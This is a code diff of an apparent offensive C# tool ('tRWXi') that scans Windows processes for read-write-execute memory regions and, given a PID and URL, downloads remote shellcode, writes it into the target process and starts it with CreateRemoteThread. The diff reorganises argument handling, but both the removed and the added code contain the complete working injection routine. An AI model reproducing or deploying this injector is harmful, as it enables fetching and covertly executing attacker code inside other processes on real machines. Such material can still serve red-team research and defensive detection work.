@@ -92,45 +92,56 @@ namespace tRWXi
 
                 IntPtr nbw = IntPtr.Zero;
 
-                Console.WriteLine("[!] Started enumeration");
-
-                while (hResult)
+                if (parameters.ContainsKey("enumerate") || (parameters.ContainsKey("url") && parameters.ContainsKey("pid")))
                 {
-                    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int) pe.th32ProcessID);
-                    while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
-                    {
-                        lpAddress = new IntPtr (mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
-                        if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) 
-                        {
-                            if (!processes.ContainsKey((int)pe.th32ProcessID))
-                            {
-                                processes.Add((int)pe.th32ProcessID, pe.szExeFile);
+                    Console.WriteLine("[!] Started enumeration");
 
-                                if (parameters.ContainsKey("pid") && parameters.ContainsKey("url"))
+                    while (hResult)
+                    {
+                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);
+                        while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
+                        {
+                            lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
+                            if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
+                            {
+                                if (!processes.ContainsKey((int)pe.th32ProcessID))
                                 {
-                                    if (Convert.ToInt32(parameters["pid"]) == (int)pe.th32ProcessID)
+                                    processes.Add((int)pe.th32ProcessID, pe.szExeFile);
+
+                                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("url"))
                                     {
-                                        Console.WriteLine("[!] Started injection");
-                                        string url = parameters["url"];
-                                        byte[] shellcode = Utils.Shellcoder.fetch(url);
-                                        WriteProcessMemory(hProcess, mbi.BaseAddress, shellcode, shellcode.Length, out nbw);
-                                        Console.WriteLine("Written " + nbw.ToString() + " bytes into RWX region");
-                                        CreateRemoteThread(hProcess, IntPtr.Zero, 0, mbi.BaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+                                        if (Convert.ToInt32(parameters["pid"]) == (int)pe.th32ProcessID)
+                                        {
+                                            Console.WriteLine("[!] Started injection");
+                                            string url = parameters["url"];
+                                            byte[] shellcode = Utils.Shellcoder.fetch(url);
+                                            WriteProcessMemory(hProcess, mbi.BaseAddress, shellcode, shellcode.Length, out nbw);
+                                            Console.WriteLine("Written " + nbw.ToString() + " bytes into RWX region");
+                                            CreateRemoteThread(hProcess, IntPtr.Zero, 0, mbi.BaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+                                        }
                                     }
                                 }
                             }
                         }
+                        CloseHandle(hProcess);
+                        hResult = Process32Next(hSnapshot, ref pe);
+                        lpAddress = IntPtr.Zero;
                     }
-                    CloseHandle(hProcess);
-                    hResult = Process32Next(hSnapshot, ref pe);
-                    lpAddress = IntPtr.Zero;
-                }
-                CloseHandle(hSnapshot);
-                foreach (KeyValuePair<int, string> pair in processes)
+                } else
                 {
-                    Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
+                    Utils.Helper.help();
+                    Environment.Exit(0);
                 }
+                
+                CloseHandle(hSnapshot);
 
+                if (parameters.ContainsKey("enumerate"))
+                {
+                    foreach (KeyValuePair<int, string> pair in processes)
+                    {
+                        Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
+                    }
+                }
             }
             catch (Exception ex)
             {
